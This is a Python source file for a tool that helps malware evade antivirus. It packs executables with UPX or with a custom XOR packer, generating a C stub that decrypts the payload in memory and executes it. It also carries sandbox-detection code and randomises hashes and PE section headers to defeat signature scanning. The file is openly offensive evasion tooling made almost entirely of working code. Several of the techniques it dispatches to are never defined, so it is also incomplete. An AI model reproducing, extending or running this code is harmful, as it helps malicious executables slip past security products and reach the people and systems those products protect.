import os
import subprocess
import random
import string
import pefile
import hashlib

class AVEvasive:
    def __init__(self):
        self.output_dir = "output/evaded"
        os.makedirs(self.output_dir, exist_ok=True)
    
    def apply_evasion(self, filepath, technique):
        """Apply AV evasion techniques"""
        if not os.path.exists(filepath):
            return None
        
        if technique == "1":  # Packers
            return self.apply_packers(filepath)
        elif technique == "2":  # Code Obfuscation
            return self.code_obfuscation(filepath)
        elif technique == "3":  # Polymorphic
            return self.polymorphic_engine(filepath)
        elif technique == "4":  # Metamorphic
            return self.metamorphic_engine(filepath)
        elif technique == "5":  # Sandbox Detection
            return self.add_sandbox_detection(filepath)
        elif technique == "6":  # Anti-Debugging
            return self.add_anti_debugging(filepath)
        elif technique == "7":  # Signature Manipulation
            return self.manipulate_signatures(filepath)
        
        return None
    
    def apply_packers(self, filepath):
        """Apply various packers to executable"""
        output_path = f"{self.output_dir}/{os.path.basename(filepath)}.packed"
        
        # Try UPX first
        try:
            subprocess.run([
                "upx", "--best", "--ultra-brute",
                "-o", output_path,
                filepath
            ], capture_output=True)
            
            if os.path.exists(output_path):
                print(f"{Colors().GREEN}[+] UPX packing successful{Colors().ENDC}")
                return output_path
        except:
            pass
        
        # If UPX fails, create custom packing
        return self.custom_pack(filepath)
    
    def custom_pack(self, filepath):
        """Custom packing technique"""
        with open(filepath, 'rb') as f:
            original = f.read()
        
        # Add junk code at beginning
        junk = b'//' + os.urandom(1024) + b'\n'
        
        # Simple XOR with random key
        key = os.urandom(32)
        packed = bytearray()
        
        for i, byte in enumerate(original):
            packed.append(byte ^ key[i % len(key)])
        
        # Create stub that decrypts at runtime
        stub = f"""
#include <windows.h>
#include <stdio.h>

void decrypt(unsigned char* data, unsigned int size, unsigned char* key) {{
    for(unsigned int i = 0; i < size; i++) {{
        data[i] ^= key[i % 32];
    }}
}}

int main() {{
    // Embedded payload
    unsigned char payload[] = {{{','.join([str(b) for b in packed])}}};
    unsigned char key[] = {{{','.join([str(b) for b in key])}}};
    
    // Decrypt in memory
    decrypt(payload, sizeof(payload), key);
    
    // Execute in memory
    void (*func)() = (void(*)())payload;
    func();
    
    return 0;
}}
"""
        
        output_path = f"{self.output_dir}/{os.path.basename(filepath)}.custom.exe"
        
        # Compile (if on Windows with MinGW)
        try:
            with open("temp_stub.c", "w") as f:
                f.write(stub)
            
            subprocess.run([
                "x86_64-w64-mingw32-gcc",
                "temp_stub.c",
                "-o", output_path,
                "-s",  # Strip symbols
                "-Os"  # Optimize for size
            ], capture_output=True)
            
            os.remove("temp_stub.c")
            
            if os.path.exists(output_path):
                return output_path
        except:
            pass
        
        return filepath
    
    def add_sandbox_detection(self, filepath):
        """Add sandbox detection techniques"""
        detection_code = """
// Sandbox detection techniques
int detect_sandbox() {
    // Check for common sandbox artifacts
    const char* sandbox_files[] = {
        "C:\\\\sample.exe",
        "C:\\\\malware.exe",
        "C:\\\\test.exe",
        "/sample", "/malware", "/test"
    };
    
    for(int i = 0; i < sizeof(sandbox_files)/sizeof(sandbox_files[0]); i++) {
        if(access(sandbox_files[i], F_OK) != -1) {
            return 1; // Sandbox detected
        }
    }
    
    // Check for short uptime (sandboxes often have short uptime)
    #ifdef _WIN32
        DWORD tickCount = GetTickCount();
        if(tickCount < 300000) { // Less than 5 minutes
            return 1;
        }
    #endif
    
    // Check for low resource environment
    MEMORYSTATUSEX memInfo;
    memInfo.dwLength = sizeof(MEMORYSTATUSEX);
    GlobalMemoryStatusEx(&memInfo);
    
    if(memInfo.ullTotalPhys < (2 * 1024 * 1024 * 1024)) { // Less than 2GB RAM
        return 1;
    }
    
    return 0; // No sandbox detected
}
"""
        
        # This would need to be integrated into the actual executable
        # For now, return original
        return filepath
    
    def manipulate_signatures(self, filepath):
        """Manipulate file signatures to evade AV"""
        with open(filepath, 'rb') as f:
            data = f.read()
        
        # Add random bytes to change hash
        modified = data + os.urandom(random.randint(100, 1000))
        
        # Modify PE headers if it's a Windows executable
        if filepath.lower().endswith(('.exe', '.dll')):
            try:
                modified = self.modify_pe_headers(modified)
            except:
                pass
        
        output_path = f"{self.output_dir}/{os.path.basename(filepath)}.modified"
        with open(output_path, 'wb') as f:
            f.write(modified)
        
        return output_path
    
    def modify_pe_headers(self, pe_data):
        """Modify PE headers to evade signature detection"""
        pe = pefile.PE(data=pe_data)
        
        # Change section names
        for section in pe.sections:
            original_name = section.Name.decode().rstrip('\x00')
            if original_name in ['.text', '.data', '.rdata']:
                # Rename section
                new_name = '.' + ''.join(random.choices(string.ascii_lowercase, k=6))
                section.Name = new_name.encode().ljust(8, b'\x00')
        
        # Add new sections with junk
        new_section = pefile.SectionStructure(pe.__IMAGE_SECTION_HEADER_format__)
        new_section.__unpack__(bytearray(new_section.sizeof()))
        
        new_section.Name = b'.junk'
        new_section.Misc_VirtualSize = 0x1000
        new_section.VirtualAddress = pe.sections[-1].VirtualAddress + pe.sections[-1].Misc_VirtualSize
        new_section.SizeOfRawData = 0x200
        new_section.PointerToRawData = len(pe_data)
        new_section.Characteristics = 0xE0000020  # Readable, executable, contains code
        
        pe.sections.append(new_section)
        pe.__structures__.append(new_section)
        
        # Rebuild
        return pe.write()
